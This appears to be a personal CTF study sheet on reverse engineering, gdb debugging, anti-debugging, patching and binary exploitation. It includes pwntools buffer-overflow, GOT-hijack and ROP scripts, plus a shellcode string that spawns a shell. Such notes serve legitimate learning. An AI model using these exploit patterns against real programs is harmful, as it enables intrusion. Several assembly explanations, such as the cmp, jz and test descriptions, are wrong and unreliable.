# Reverse Engineering Basics
- **BROKEN:** do `strings <fileName> | grep "<stringToSearch>"` to search for a specific string in the binary (maybe with it you can directly find the flag);
- **BROKEN:** when disassembling every file with gdb, do:
  - b main: to set a breakpoint on the main function;
  - r: to run the program that will be blocked by the breakpoint on the main function;
  - disas main: to achieve the new real addresses of the main function.
  - This will prevent the PIE to give you addresses that are not true, but only logical.
- In this specific order, those are the registers used to pass parameters to functions:
  - `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`, and so on with numbers;
  - **NOTE:** you can replace the `r` with `e` and it's the same register but with a different name (it indicates only that the size rappresented is different);
- To return a value, usually the registers `rax` (=`eax`);
- `test <source1><source1>` see if source1 it's empty (doing a bit to bit logic and), and if it's empty returns 0 otherwise it returns 1; 
- `call qword ptr [<registername>]`: it calls the function that's pointed by the pointer value inside of the register (i.e. call qword ptr[rbx]);
- How the JUMP instruction works? (the example is only with `jz` but it's the same logic for every jump):
  - if the instruction is `jz <address1> <address2>`, if the condition is met (in this specific case the ZERO_FLAG is at 0), we will jump at `<address1>` else we jump at `<address2>`;
- **Visit  [HERE](https://www.tutorialspoint.com/assembly_programming/assembly_conditions.htm) to see how every jump behaves**;
- How the `test` command works:
```assembly
; Conditional Jump
test cl,cl   ; set ZF to 1 if cl == 0
jz 0x804f430  ; jump if ZF == 1

; Conditional Jump with NOT
test cl, cl   ; set ZF to 1 if cl == 0
jnz 0x804f430  ; jump if ZF == 0

; or
test eax, eax  ; set SF to 1 if eax < 0 (negative)
js error ; jump if SF == 1

;regular application
test al, $0F      ; set ZF if "al AND $0f = 0" (here: address-align test for 16b)
jnz @destination  ; jump if eax IS NOT "MODULO 16=0"
```

**NOTE:** `cmp <register1> <register2>` <u>sets the ZERO_FLAG at 0 if the two registers are equal</u>.
# Patching
- To replace a call with NOP you have to replace every single 2 digit hex number of the call with the HEX value of NOP, that's `90`; 
- **Visit [HERE](http://ref.x86asm.net/coder32.html) to have the HEX format of Assembly x86 commands**;
- **NOTE:** you can patch directly inside IDA going to:
  - Edit -> Patch Program -> Patch bytes;
  - After you patched what you wanted, go to save it doing: Edit -> Patch Program -> Apply patches to input file;

**NOTE:** that patching shouldn't always be done; a lot of times you can just simply debug and inspect values, if all you have to do is find a flag. Patching could lead to not executing function that the process care about to execute correctly.
# Debugging
## Basics
- You can use the command `jump <FunctionName>` when for example you are on a breakpoint, to execute a spefic function, without following the normal flow of the code;
- **NOTE:** you can combine the `jump` to various strategic breakpoints to execute the code flow as you like.

## AntiDebugging
If you are trying to use GDB but it doesn't work (i.e. message there is already a debugger), there is an anti-debugging technique applied.
Try to search for a `ptrace`. Usually it's called at the beginning of the main, and if it's not there you could try to search inside of `_start` (the file that calls the main to start the process).

**NOTE:** IDA offers a search function, where you can search ptrace (you have only to find the HEX values of the call to ptrace, to replace them with NOP).

### Things to search for in case of AntiDebugging
- `ptrace` calls: the application tries to debug itself by calling ptrace(PTRACE_TRACEME, ...);
- `env` calls: the application checks the existence of LINES and COLUMNS environment variables;
- `vdso` calls: the appliation measures distance of vdso and stack;
- `noaslr` calls: the application checks base address of ELF and shared libraries for hard-coded values used by GDB;
- `parent` calls: the application checks whether parent's name is GDB, strace or ltrace;
- `nearheap` calls: the application compares beginning of the heap to address of own BSS. 

## Usage of GDB
GDB is a debugger that you can use to execute commands, analyze memory cells, and inspect the program.

To use it you have to insert yourself in the folder where the binary you want to analyze is placed, and then call `gdb` in your terminal.

After that you can:
- run `file <pathAlBinary>`: to open a binary in debug mode;
- run `break <functionName>`: to set a breakpoint at the beginning of the funciont (i.e. <u>break main</u>);
    - alterantively:
      - `b <functionName>` you can abbreviate "break" with "b";
      - `break *<pointer>` you can place a breakpoint on a specific pointer of a line of code (**keepInMind:** the pointer has to be specified in the 0x\<something> format to be accepted (i.e. b *0x00000000004008a8 or b *0x4008a8));

    **WARNING:** it could happen that GDB says 'Cannot insert breakpoint \<numberOfBreakpoint>' and that it can't access the memory at address \<addressOfBreakpoint>. To solve this problem just use the `delete` command, to remove all the breakpoints, then use the `c` command, to continue the execution of the program to reach its end. Now if you inspect again the `disas main`, or wathever function you were disassembling, the addresses are changed, and you can try re-setting you breakpoints with the new addresses.
- run `next` after you set a breakpoint to go to the next assembly line of code;
- run `run` (alternatively just `r`): to run the execution of the code;
- run `jump <functionName>`: to execute a specific function (ignoring the codeflow);
- run `disas <functionName>`: to disassemble the function (keep in mind that the disassembler could reverse the operands order in the instructions);
- run `printf "%s", (char*) <nameOfBuffer>`: if you hit a specific breakpoint and you want to see inside of a specific buffer (and you know that there is a string there), you can use this command;
  - run `print <registerName>` to print the content of a register in the HEX 0x format;
- run `x/s <ptrOfBuffer>` (**not with registers, use print instead**): it does the same thing as the command before; it allows you to see inside a buffer, that HAS TO BE specified in the 0x<something> format (i.e. x/s *0x6013E8);
  - `$<nameOfRegister>` in case of register (and not addresses in hex formats), and `&<variableNames>` in case of variable names (inside the memory);
- run `x/i &<nameOfBuffer>`:  it shows you the memory address of a specific buffer (varible in memory);
- run `exit`: to exit gdb;
- run `info registers`: this will show you the values inside every single register at a specific point in the code. You can combine the information of the registers during a specific breakpoint, with the `x/s` command, to analyze each value, inspecting parameters or return values as you wish.
# Pwning
## Buffer Overflow
To solve those kind of challenges make sure to have a deep understanding on how memory works and how to use the basePointer/stackPointer to access values.

Tricks for simple challenges:
- If a buffer is contiguous in memory to a veriable, you can overwrite the variable exeding the buffer with the content you input in. All you have to do is to calculate the distance between the pointer of variable A to the pointer of variable B;
- Before talking about `pwntools`, I want to let you know that you can check the architecture of the system that compiled the program by using: `checksec <programName>` (that could be useful if you need to know the size of the registers)(<u>for example when you need to create addresses that will be injected</u>);
- We can use tools like `pwntools` (a python library) to generate inputs to send to a process (like in the following example):
 ```python
 #Importing the library
 from pwn import *

#Setting up the garbage and the message to inject
garbage = "a" * 64
msg = "H!gh"
msgin = garbage + msg

#Opening the process to attack
p = process("./pwn0")

#Sending the injected code
p.sendline(msgin)

#Retrieving the output of the program
msgout = p.recvall()

print("Output: \t", msgout)
 ```

- Another common thing from pwning is to call specific line of code (breaking the flow of the program) to execute it in unintended ways (for example you could jump to a specific address in memory if it's decided at runtime)(example below):
```python
from pwn import *

#When you found at what pointer you want to jump to, you can generate that address in p64 with pwntools
target_address = p64(0x4007A2)
#Creation of the garbage and setting up of the message
garbage = b"java" + b"a" * 28
msgin = garbage + target_address

#Opening the process
p = process("./java")
#Injecting the malicious input
p.sendline(msgin)
#Going in interactive mode (really usefull if you have to activate a shell and you want to use it manually)
p.interactive()
```
### Executing using the return call of a function
We can execute something if we achieve to go outside the buffer and overwrite the base pointer and the return call.
The difficult part is that we have to understand what's the distance between the end of the buffer and the beginning of the return call register.
To achieve that we use `gdb-peda` (a special version of gdb to test security vulnerabilities).
Commands to use:
- `pattern_create <numberOfCharForBuffer> <nameOfTheFileWhereThePatternWillBeStored>`: will create a pattern to use with the next command;
  - You can use `run < <nameOfTheFileWhereThePatternIsStored>`, to input the pattern inside of the program (you obviusly have to open it with gdb), and see (if you generated a buffer overflow) the information inside every register, and additional information that coul be useful paired with the next command.
- `pattern_search`: it uses the pattern created before as an input for a program. The good part is that it will tell you what are the registries where group of chars from the pattern have been spotted (and their distance from the stack pointer)

### Spawning shell using only hex injection
This requires the code to execute the content of a specific register or memory varible you can manipulate. By doing so you can achieve this:
```python
from pwn import *

#the instructions in hex decode, to execute a shell
shellHex = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

p = process("./vuln")

p.sendline(shellHex)

p.interactive()
```

## GOT and PLT Hijacking
In this kind of situation you have to check first with `checksec` if the executable file is writable in the GOT table. We have to check if it's not Full RERLO (in this case the GOT it's writable in some parts), otherwise the GOT it's readonly and then <u>the GOT attack in this case it's not usable</u>.
In case the GOT is hijackable you should try to:
- you have to find the address in the GOT of the function you want to hijack (to do that in IDA, you simply have to click two times on the function coming from a library, and then click two times on its offset, in this way you access to the GOT/PLT address);
- after that you have to find the address of the instruction that you want to replace the first one with (simply see the hex value of the code you want to execute);
- Then you can use something like pwntools in python, to use the information you retrieved to access what you want:
```python
from pwn import *

#here I want to override the puts function
putsGOT = "0804A00C"
#with the code coming from the win routine
winAddr = "0804854B"

io = process("./auth")

#NOTE: sendlineafter as the name suggests, send a line of input only when the string specified is outputted in the console.
io.sendlineafter("?\n", putsGOT)
io.sendlineafter("\n", winAddr)

#opens in interactive mode
io.interactive()
```
  
**NOTE**: let the program execute at least one time the function that you want to override (to let the lazy linker load the information from the libraries) (that's why we use pwntools, because it allows us to run it at runtime);
**WARNING**: be really careful of the type that's accepted by the scanf:
- if it's `%x` then you have to insert the value of the address in HEX, because it needs a pointer;
- if it's `%d` then you have to insert the value of the address in digits and NOT in HEX, otherwise it generates an error.
```python
from pwn import *

#Here for example we need digits, so we convert the hex string in int and we provide an int
exitGOT = int("804A01C", 16)
winAddr = int("80485C6", 16)

io = process("./vuln")

io.sendlineafter("Input address\n", str(exitGOT))
io.sendlineafter("value?\n", str(winAddr))

print(io.recvall())
```

### BONUS on GOT/PLT
You can use pwn tools event to retrieve the corresponding addresses that you need in this way:
from pwn import *
```python
# Here there is another way to setup a pwntools process. While setting the context, we are specifying what process 
context.binary = './vuln'


# Here it's setting up the process using the context builded before
io = process(context.binary.path)

# Here we are creating a copy of the binaries, to use if for analyzing them.
# In fact, through them you can analyze the got, symbols and so on.
elf = context.binary

#access got in search for the exit function
exit_got = elf.got['exit']
#here it access win as a symbol because a symbol it's a variable or a function, inside of the binary (not coming from external libraries).
win_addr = elf.symbols['win']

#override got exit entry with win address
#note that we are converting it to a string because they are numbers ('%d')
io.sendlineafter('address\n', str(exit_got))
io.sendlineafter('value?\n', str(win_addr))


#print result
print(io.recvall())
```

### Bonus in case of PIE enabled
If the PIE it's enabled we need to first find the actual main addres from where we should start to see the addresses of the functions.
To do that we can follow the following example:
```python
from pwn import *

#as done before
context.binary = './challenge'

#as done before
io = process(context.binary.path)

# Receive the address of main (the real address in memory)
main = io.unpack()

#as done before
elf = context.binary

#here it's recalculating the base address based on the real current position of the main in memory
elf.address = main - elf.symbols['main']

#as done before
where = elf.got['read']

#as done before
what = elf.symbols['oh_look_useful']

#here we are sending the payload using .pack() instead of sendline or sendlineafter, because in this case we needed to send the string rappresentation of the int on the read() function. TLDR: it accepts values with a size of 8 bytes, but the format it's not specified, so we have to send a strange int in a str format.
io.pack(where)
io.pack(what)

# Enjoy the shell
io.interactive()
```

## ROP - Return Oriented Programming
It's a style of attack that uses pre existent code in the binary in a certain way, to execute whatever you want.
It starts as a simple buffer overflow where you modify the return value to execute one specific information, but after that, you chain other small instructions that are really small and have a return after that (that are commonly called gadgets), to execute malicious code.
To search for the pieces you need you can use <u>ROPgadget</u>, a tool that finds all the gadgets in a specific binary.
To use it you can do this: `ROPgadget --binary <nomeFileDaAnalizzare> | grep <nomeComandoCheCiInteressa>` (i.e. `ROPgadget --binary split | grep "rdx"` to search for a gadget that uses rdx).

After finding the gadgets that you need, you only have to create the pwntools python script to execute the malicious code that you want to execute.

Sometimes it might happen that doing ROP chains casues a segmentation fault just before the system call to print the flag. In that situation find a gadget that only returns ("ret" is the instruction), and call it one or two times before the system call (doing that should allign the stack pointer and make the system call work).
```python
from pwn import *

# this is to arrive before the return address override
garbage = b"a" * 40
# this is the gadget that we use to in this case pop from the stack to rdi
gadget = p64(0x4007C3)
# this is the command that should go inside of the system call
print_flag = p64(0x601060)
# that is a gadget to invoke for the system call
system = p64(0x400560)

msgin = garbage + gadget + print_flag + p64(0x40053E) + system

io = process("./split")

io.sendlineafter("> ", msgin)

# going into interactive mode sometimes can make the program work (try without or printing .recvall() if in doubt)
io.interactive()
```

What you have to understand in this kind of challenges is that you firstly find the way to pop something from the stack for example, and then you put the address of something that you want to add on the stack, so that the first instruction pops the second thing added (that's the reason why gadget is before print_flag in the python script).
If you are wondering why system is after printt_flag, well system it's a call to function, so it's not read as a value on top of the stack.

# Quick process notes:
## Patching related:
If you can patch the program, probably you should do it. The most useful things to do are:
   1. Changing `jz` to `jnz` or viceversa;
   2. Replacing unwanted calls with `NOP`;
   3. In some strange cases, if you have to set to zero a registers, and you only have only four hex digits to change, you can do `xor <register> <register>`;
## Pwning & Debugging related:
1. If you only have to <u>reach a flag with some specified keyword</u> in it, use the combo `strings` with `grep`.
2. Use `checksec <fileName>` to see if **RELRO** and **PIE** are enabled, then probably the GOT Hijacking it's not the solution. Do it anyways just to check the address architecture.
3. If the program (strangely) asks you to put two addresses where the first one will be overwritten by the second one, then probably the GOT Hijacking it's the solution.
4. If you have to execute a specific function outside of the main then:
   1. If you can use GDB and the `jump` command, then use it in the right place and you are done (maybe help yourself with some breakpoints, and analyze at worst registers or memory with `x` or the `printf` command that you can find in one of the upper section);
      1. If you can use GDB keep in mind that some counter methods could be applied, like for example `ptrace`. Check in the ReverseEngeneering/Debugging section, to see how to avoid them.
     1. If you can't do the upper option than maybe pwning it's the right choice. If it's the case control three things (if one of them it's true, use their solution method):
         1. Using pwning you should overwrite some variable in the memory, by exceding the buffer, that will be later checked by a `compare`. If this is the case, than you only have to understand by how much you have to write to put values inside the wanted buffer.
         2. Using pwning you should call another function that's not called by the normal execution flow. If that's the case you have to use the `pattern` method offered by gdb-peda, to find the distance of the caller return pointer.
            - **NOTE**: in this case after doing `pattern_search` (in the correct way), you should search for the `EIP/RIP` and `ESP/RSP` registers, and see the offset.
         3.  Using pwning you have to chain sequences of instructions to gain what you want, than you should use the **ROP chain** method.
            1. Remember to use the `ROPgadget` to find the elements that you want to use (search for `ret` to have the mini gadgets you need).
            2. Remember to align the stack with the `ret` only instruction in case you have to call a gadget that uses `system`.
         4. If you have to spawn a shell and all you can do is inserting a value in the buffer that will be processed by the `call` in assembly, that try using the **hex shell injection** described in the sections before.